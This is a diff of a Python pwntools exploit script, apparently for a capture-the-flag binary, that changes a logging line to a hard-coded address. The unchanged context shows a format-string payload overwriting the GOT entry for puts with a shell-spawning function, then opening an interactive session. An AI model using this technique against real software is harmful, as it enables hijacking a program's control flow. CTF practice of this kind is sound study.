@@ -29,7 +29,7 @@ shell = elf.functions['holidays']
 
 info('Format string offset %#x', offset)
 info('Address to overwrite (elf.got.puts): %#x', elf.got.puts)
-info('Address to write func() shell: %#x', shell)
+info('Address to write func() shell: %#x', 0x000000000040123b)
 
 # Send payload 
 io.recvuntil(b'=[Your name]:')
@@ -39,4 +39,3 @@ payload = fmtstr_payload(offset, {elf.got.puts: shell})
 io.sendline(payload)
 
 io.interactive()
-
